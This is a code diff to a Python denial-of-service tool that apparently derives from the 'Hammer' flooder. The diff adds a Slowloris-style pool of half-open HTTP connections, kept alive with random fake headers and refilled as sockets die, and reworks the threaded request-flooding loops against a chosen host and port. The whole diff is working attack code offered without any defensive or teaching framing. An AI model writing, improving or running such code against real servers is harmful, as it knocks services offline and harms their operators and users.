@@ -32,13 +32,27 @@ def my_bots():
 
 
 def bot_hammering(url):
-	try:
-		while True:
+	while True:
+		try:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
-	except:
-		time.sleep(.1)
+		except:
+			time.sleep(.1)
+
+
+#persistent connection pool
+hold_sockets = []
+hold_lock = threading.Lock()
+
+def init_hold_socket():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.settimeout(4)
+	s.connect((host,int(port)))
+	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('utf-8'))
+	s.send("User-Agent: {}\r\n".format(random.choice(uagent)).encode('utf-8'))
+	s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
+	return s
 
 
 def down_it(item):
@@ -56,8 +70,29 @@ def down_it(item):
 			time.sleep(.1)
 	except socket.error as e:
 		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
+
+
+def hold_connections():
+	while True:
+		with hold_lock:
+			#keep-alive on active sockets
+			for s in list(hold_sockets):
+				try:
+					s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode('utf-8'))
+				except socket.error:
+					hold_sockets.remove(s)
+			#replace dead sockets
+			diff = thr - len(hold_sockets)
+			if diff > 0:
+				for _ in range(diff):
+					try:
+						s = init_hold_socket()
+						hold_sockets.append(s)
+					except socket.error:
+						break
+		print("\033[93mhold:",len(hold_sockets),"active\033[0m")
+		time.sleep(15)
 
 
 def dos():
@@ -137,27 +172,35 @@ if __name__ == '__main__':
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
-		s.settimeout(1)
+		s.close()
 	except socket.error as e:
 		print("\033[91mcheck server ip and port\033[0m")
 		usage()
+	#init persistent socket pool
+	for _ in range(int(thr)):
+		try:
+			s = init_hold_socket()
+			hold_sockets.append(s)
+		except socket.error:
+			break
+	print("\033[93mhold:",len(hold_sockets),"sockets\033[0m")
+	ts = threading.Thread(target=hold_connections)
+	ts.daemon = True
+	ts.start()
+	#worker threads capped at 200 to avoid OS limit
+	workers = min(int(thr), 200)
+	for i in range(workers):
+		t = threading.Thread(target=dos)
+		t.daemon = True
+		t.start()
+		t2 = threading.Thread(target=dos2)
+		t2.daemon = True
+		t2.start()
+	item = 0
 	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+		if (item>1800):
+			item=0
+			time.sleep(.1)
+		item = item + 1
+		q.put(item)
+		w.put(item)
